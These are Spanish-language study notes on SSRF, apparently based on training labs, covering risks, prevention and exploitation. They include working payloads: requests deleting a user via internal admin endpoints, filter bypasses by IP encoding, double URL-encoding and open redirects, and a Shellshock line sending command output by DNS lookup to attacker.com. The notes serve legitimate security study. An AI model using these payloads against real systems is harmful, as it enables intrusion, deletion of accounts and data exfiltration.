 ------------
# Definición

>**Server-side Request Forgery (SSRF)** ocurre cuando una aplicación web acepta una URL o dirección proporcionada por el usuario y la utiliza para hacer una solicitud desde el servidor, sin validarla correctamente. Esto puede permitir al atacante forzar al servidor a conectarse a servicios internos (como `localhost`, bases de datos, APIs privadas, etc.) o incluso a otros servidores externos.

## Riesgos potenciales:

- Acceso a *recursos internos* (red local, metadata de servicios en la nube como AWS).
    
- Descubrimiento de *puertos* y *servicios*.
    
- *Escalada de privilegios* o acceso no autorizado.
    
- En algunos casos, ejecución remota de código (*RCE*).

## Medidas de prevención:

- *Validar* y *filtrar* adecuadamente las URLs ingresadas por los usuarios.
    
- Usar *listas blancas* de destinos permitidos.
    
- No permitir *conexiones arbitrarias* desde el servidor hacia destinos controlados por el usuario.
    
- *Restringir* el acceso del servidor a redes internas si no es necesario.

-----------
# Explotación

## Básica

- El servidor tiene una funcionalidad que hace peticiones a recursos internos de la propia máquina. El *parámetro de la búsqueda lo controla el usuario*.

	Si *no se emplean medidas de protección*, el usuario puede hacer que el servidor solicite esos recursos y los muestre como respuesta.

	-Ejemplo:

	El servidor tiene una funcionalidad de "Check stock" que realiza una petición a un recurso interno que da el valor del stock, mediante un parámetro ``stockAPI``.

	Como no está protegido, cambiamos stockAPI para borrar al usuario carlos:
	``` text
	stockAPI=http://localhost/admin/delete?username=carlos
	```

------------
# SSRF a otro sistema back-end

Se pueden *realizar peticiones a los diferentes sistemas conectados a la red interna* del servidor, ya que el servidor es quien va a hacer estas peticiones.

Para explotarlo, hay que identificar las IP de los diferentes equipos de la red.

Un ejemplo de IP sería ``192.168.0.X`` donde X es el parámetro a brute-forcear.

También habría que realizar fuerza bruta por puerto y además por recurso.

``` text
stockApi=http://192.168.0.9:8080/admin/delete?username=carlos
```

----------
# Blind SSRF out-of-band detection

Si la funcionalidad vulnerable a SSRF realiza peticiones sin validar el destino pero no muestra contenido, se puede tratar de forzar una petición a un servidor propio.

- Ejemplo:

	El servidor tiene una funcionalidad de analíticas basada en la cabecera Referer. Esta funcionalidad es vulnerable a SSRF, ya que realiza una petición al host del campo Referer. Entonces, podemos introducir:
	``` java
	Referer: http://attacker.com
	```

*\*Nota*: Esta técnica se puede utilizar para exfiltrar datos.
- [[#Blind SSRF with Shellshock exploitation]]

-------------
# Blacklist-based input filter bypass

Si el input está siendo filtrado por palabras prohibidas, como *localhost*, *127.0.0.1*, etc. Puede bypassearse de diferentes formas:

## Cambio de referencia del localhost

### Por abreviatura

- El localhost se puede representar con formas abreviadas de su IP:
	`127.0.1`, `127.1`.

	Otras variantes como `127.loquesea.loquesea.loquesea` también son válidas, pero no necesariamente pueden ser interpretadas correctamente por el servidor.

### Por conversión hexadecimal

- Se puede representar el localhost como un número hexadecimal de 127.0.0.1 o sus abreviaturas.
	**127.0.0.1 en hexadecimal = 0x7F000001**

### Por conversión decimal

- Del mismo modo que con la conversión hexadecimal, aunque con menos probabilidades de ser exitoso, se puede convertir la IP local en decimal.
	**127.0.0.1 en decimal = 2.130.706.433**

## Doble url-encode de caracteres

 - Cuando el filtro no es en la IP sino en alguna palabra clave (como el nombre de un recurso existente), una técnica que se puede utilizar es url-encodear un caracter concreto dos veces.

	Por ejemplo, si la palabra prohibida es *admin*, se puede probar a realizar una solicitud como:
	``` URL
	http://127.0.0.1/%2561dmin
	```

----------
# Filter bypass via Open Redirection

Si el input vulnerable a SSRF *funciona con endpoints locales* de la máquina, si se encuentra un open redirection, se puede aprovechar para explotar el SSRF a recursos internos del servidor u otros hosts de la red local.

- Ejemplo:

	El servidor tiene una vulnerabilidad SSRF en el *stock checker*, pero solo a nivel de endpoints locales.

	Además, el servidor presenta un open redirection en el parámetro *path* del siguiente endpoint:
	``` URL
	/product/nextProduct?currentProductId=1%26path=http://google.es
	```

	Para explotar entonces el SSRF, podemos enviar el siguiente contenido al stock checker:
	``` text
	stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
	```
	De esta forma se eliminaría al usuario carlos.

----------
# Blind SSRF with Shellshock exploitation

Si el servidor utiliza una versión antigua de *Bash*, vulnerable a shellshock attack, se puede aprovechar para ejecutar comandos y exfiltrar información mediante un *DNS lookup*.

- Ejemplo:

	Si la cabecera se guarda en una variable de Bash, se puede inyectar el siguiente contenido:
	``` text
	() { :; }; /usr/bin/nslookup $(whoami).attacker.com
	```

	El servidor de atacante recibirá una petición DNS con el contenido del comando inyectado, de la forma:
	``` text
	user123.attacker.com
	```

-------------
# Whitelist-based input filter bypass

Si se está filtrando por un nombre de dominio concreto, se puede intentar bypassear utilizando la característica de autenticación via URL.

- Ejemplo:

	El servidor tiene una función con un parámetro vulnerable a SSRF, pero bloquea todas las peticiones que no vayan dirigidas a *stock.weliketoshop.net*.

	Se puede tratar de introducir credenciales falsas que referencien el dominio que queremos visitar.
	``` URL
	http://localhost:80@stock.weliketoshop.net
	```
	Sin embargo, este contenido no realizará la petición al localhost. Para ello, hay que engañar al servidor para que crea que el dominio de stock es un id html. Para lograrlo, hay que introducir un *#* doble url-encodeado.
	``` URL
	http://localhost:80%2523@stock.weliketoshop.net
	```
	Para acceder a recursos, se puede añadir el *path* al final de la URL:
	``` URL
	http://localhost:80%2523@stock.weliketoshop.net/admin
	```